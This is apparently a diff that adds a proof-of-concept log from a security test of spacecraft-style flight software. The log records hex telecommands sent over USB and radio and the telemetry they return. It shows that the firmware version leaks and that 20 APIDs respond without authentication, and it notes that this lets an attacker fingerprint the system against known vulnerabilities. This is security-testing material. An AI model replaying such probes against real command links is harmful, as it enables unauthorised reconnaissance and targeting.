@@ -1,0 +1,134 @@
+[   0.000] ========================================================================
+[   0.000] V-01 SEND_FW inventory leak
+[   0.000] ========================================================================
+[   1.519] --> HARD RESET (bench parity: fresh board per PoC)
+[   8.851] --> TC apid=0x0A via=usb AES  payload=00
+[   8.903] <-- TM apid=0x0A clear len=3
+[   8.954] --> TC apid=0x1D via=usb clear payload=0101
+[   9.006] <-- TM apid=0x1D clear len=4
+[   9.006] --> TC apid=0x11 via=usb clear payload=00
+[   9.466] <-- TM apid=0x11 clear len=9
+[   9.466] --> TC apid=0x15 via=usb clear payload=001005
+[   9.917] <-- TM apid=0x15 clear len=6
+[   9.917] --> TC apid=0x0D via=usb clear payload=01
+[  10.367] <-- TM apid=0x0D clear len=4
+[  10.408] --> TC apid=0x1D via=usb clear payload=03
+[  10.459] <-- TM apid=0x1D clear len=4
+[  10.459] <-- TM apid=0x09 clear len=9
+[  10.511] --> TC apid=0x1D via=usb clear payload=0a0258
+[  10.562] <-- TM apid=0x1D clear len=4
+[  10.562] --> TC apid=0x10 via=usb clear payload=00
+[  10.614] <-- TM apid=0x10 clear len=4
+[  10.614] --> TC apid=0x21 via=usb clear payload=00
+[  11.074] <-- TM apid=0x21 clear len=6
+[  11.074] --> TC apid=0x24 via=usb clear payload=0000
+[  11.116] <-- TM apid=0x24 clear len=8
+[  11.116] --> TC apid=0x24 via=usb clear payload=0100
+[  11.167] <-- TM apid=0x24 clear len=8
+[  11.167] --> TC apid=0x24 via=usb clear payload=0200
+[  11.218] <-- TM apid=0x24 clear len=8
+[  11.218] --> TC apid=0x24 via=usb clear payload=0300
+[  11.270] <-- TM apid=0x24 clear len=8
+[  11.270] --> TC apid=0x25 via=usb clear payload=0080
+[  11.321] <-- TM apid=0x25 clear len=4
+[  11.321] --> TC apid=0x1E via=usb clear payload=01
+[  11.823] <-- TM apid=0x1E clear len=5
+[  11.823] --> TC apid=0x1D via=usb clear payload=0b
+[  11.925] <-- TM apid=0x1D clear len=4
+[  11.925] --> TC apid=0x05 via=usb clear payload=12
+[  12.386] --> TC apid=0x1F via=usb clear payload=0600000000000000000000000700
+[  12.887] <-- TM apid=0x1F clear len=4
+[  12.887] --> TC apid=0x1F via=usb clear payload=05
+[  13.389] <-- TM apid=0x1F clear len=4
+[  13.389] --> TC apid=0x0A via=usb clear payload=01
+[  13.433] <-- TM apid=0x0A AES len=3
+[  21.524] --> TC apid=0x14 via=usb AES  payload=406c841500e055bb801a060008
+[  30.001] <-- TM apid=0x0E AES len=18
+[  30.001] --> REARM (bench parity: fresh board, pre-PoC)
+[  30.073] --> TC apid=0x03 via=radio AES  payload=-
+[  30.525] <-- TM apid=0x03 AES len=5
+[  30.525] SEND_FW payload=0100000100 -> firmware version 1.0.0
+[  30.526] --> TC apid=0x0C via=radio AES  payload=-
+[  30.580] <-- TM apid=0x0C AES len=27
+[  30.580] GET_STATUS flags=0x9F: secure_link=True payload_armed=False usb_debug=False
+[  30.580] --> TC apid=0x01 via=radio AES  payload=-
+[  30.621] <-- TM apid=0x01 AES len=5
+[  30.621] --> TC apid=0x03 via=radio AES  payload=-
+[  31.083] <-- TM apid=0x03 AES len=5
+[  31.084] --> TC apid=0x04 via=radio AES  payload=0000
+[  39.549] --> TC apid=0x05 via=radio AES  payload=02
+[  39.621] --> TC apid=0x06 via=radio AES  payload=039270726f6265
+[  40.084] <-- TM apid=0x06 AES len=5
+[  40.084] --> TC apid=0x07 via=radio AES  payload=-
+[  46.566] <-- TM apid=0x07 AES len=24
+[  46.567] <-- TM apid=0x07 AES len=24
+[  46.568] <-- TM apid=0x07 AES len=24
+[  46.569] <-- TM apid=0x07 AES len=24
+[  46.570] <-- TM apid=0x07 AES len=24
+[  46.570] <-- TM apid=0x07 AES len=24
+[  46.571] <-- TM apid=0x07 AES len=24
+[  46.571] <-- TM apid=0x07 AES len=24
+[  46.571] <-- TM apid=0x07 AES len=24
+[  46.572] <-- TM apid=0x07 AES len=24
+[  46.572] <-- TM apid=0x07 AES len=24
+[  46.573] <-- TM apid=0x07 AES len=24
+[  46.573] <-- TM apid=0x07 AES len=24
+[  46.573] <-- TM apid=0x07 AES len=24
+[  46.574] <-- TM apid=0x07 AES len=24
+[  46.574] <-- TM apid=0x07 AES len=23
+[  46.575] <-- TM apid=0x09 AES len=17
+[  46.575] --> TC apid=0x07 via=radio AES retry=1 (transit-corrupt re-send)
+[  52.898] <-- TM apid=0x07 AES len=24
+[  52.900] <-- TM apid=0x07 AES len=24
+[  52.901] <-- TM apid=0x07 AES len=24
+[  52.901] <-- TM apid=0x07 AES len=24
+[  52.902] <-- TM apid=0x07 AES len=24
+[  52.902] <-- TM apid=0x07 AES len=24
+[  52.903] <-- TM apid=0x07 AES len=24
+[  52.903] <-- TM apid=0x07 AES len=24
+[  52.904] <-- TM apid=0x07 AES len=24
+[  52.904] <-- TM apid=0x07 AES len=24
+[  52.905] <-- TM apid=0x07 AES len=24
+[  52.905] <-- TM apid=0x07 AES len=24
+[  52.905] <-- TM apid=0x07 AES len=24
+[  52.906] <-- TM apid=0x07 AES len=24
+[  52.906] <-- TM apid=0x07 AES len=24
+[  52.906] <-- TM apid=0x07 AES len=23
+[  52.906] --> TC apid=0x0B via=radio AES  payload=a5000020c35a
+[  52.950] <-- TM apid=0x0B AES len=37
+[  52.950] --> TC apid=0x0C via=radio AES  payload=-
+[  52.994] <-- TM apid=0x0C AES len=27
+[  52.994] --> TC apid=0x0D via=radio AES  payload=01
+[  53.453] <-- TM apid=0x0D AES len=4
+[  53.495] --> TC apid=0x0E via=radio AES  payload=-
+[  61.961] <-- TM apid=0x0E AES len=30
+[  61.961] --> TC apid=0x0F via=radio AES  payload=-
+[  62.400] <-- TM apid=0x0F AES len=10
+[  62.400] --> TC apid=0x11 via=radio AES  payload=00
+[  62.849] <-- TM apid=0x11 AES len=9
+[  62.850] --> TC apid=0x13 via=radio AES  payload=-
+[  63.308] <-- TM apid=0x13 AES len=23
+[  63.309] --> TC apid=0x17 via=radio AES  payload=000000000000000000000000000000000000000000
+[  63.756] <-- TM apid=0x17 clear len=19
+[  63.757] --> TC apid=0x19 via=radio AES  payload=000000200800
+[  64.214] <-- TM apid=0x19 clear len=15
+[  64.215] --> TC apid=0x1D via=radio AES  payload=00
+[  64.256] <-- TM apid=0x1D clear len=18
+[  64.308] --> TC apid=0x1E via=radio AES  payload=02
+[  64.765] <-- TM apid=0x1E clear len=3
+[  64.766] --> TC apid=0x1F via=radio AES  payload=03
+[  65.216] <-- TM apid=0x1F clear len=32
+[  65.216] --> TC apid=0x20 via=radio AES  payload=-
+[  65.663] <-- TM apid=0x20 clear len=18
+[  65.664] --> TC apid=0x21 via=radio AES  payload=00
+[  66.122] <-- TM apid=0x21 clear len=6
+[  66.122] --> TC apid=0x23 via=radio AES  payload=01
+[  66.570] <-- TM apid=0x23 clear len=6
+[  66.570] --> TC apid=0x25 via=radio AES  payload=01
+[  66.621] <-- TM apid=0x25 clear len=6
+[  66.621] unauthenticated responders (20): ['0x1', '0x3', '0x6', '0x7', '0xb', '0xc', '0xd', '0xe', '0xf', '0x11', '0x13', '0x17', '0x19', '0x1d', '0x1e', '0x1f', '0x20', '0x21', '0x23', '0x25']
+[  66.621] attacker holds exact CPE (software + version + live APID map) and can match it to the published vulnerability catalogue
+[  66.622] -- console tail: [TC - SPP] APID=0x01D SEQ=1 LEN=16 FLAGS=1 SEC_HDR=NO | [TC - SPP] APID=0x026 SEQ=1 LEN=1 FLAGS=1 SEC_HDR=NO | [TC - SPP] APID=0x027 SEQ=1 LEN=29 FLAGS=1 SEC_HDR=NO | [TC - SPP] APID=0x01E SEQ=1 LEN=16 FLAGS=1 SEC_HDR=NO | [TC - SPP] APID=0x027 SEQ=1 LEN=29 FLAGS=1 SEC_HDR=NO | [TC - SPP] APID=0x01F SEQ=1 LEN=16 FLAGS=1 SEC_HDR=NO | [TC - SPP] APID=0x027 SEQ=1 LEN=29 FLAGS=1 SEC_HDR=NO | [TC - SPP] APID=0x020 SEQ=1 LEN=16 FLAGS=1 SEC_HDR=NO | [TC - SPP] APID=0x027 SEQ=1 LEN=29 FLAGS=1 SEC_HDR=NO | [TC - SPP] APID=0x021 SEQ=1 LEN=16 FLAGS=1 SEC_HDR=NO | [TC - SPP] APID=0x027 SEQ=1 LEN=29 FLAGS=1 SEC_HDR=NO | [TC - SPP] APID=0x023 SEQ=1 LEN=16 FLAGS=1 SEC_HDR=NO | [TC - SPP] APID=0x027 SEQ=1 LEN=29 FLAGS=1 SEC_HDR=NO | [TC - SPP] APID=0x025 SEQ=1 LEN=16 FLAGS=1 SEC_HDR=NO
+[  66.622] ========================================================================
+[  66.622] POC OK
+[  66.622] ========================================================================
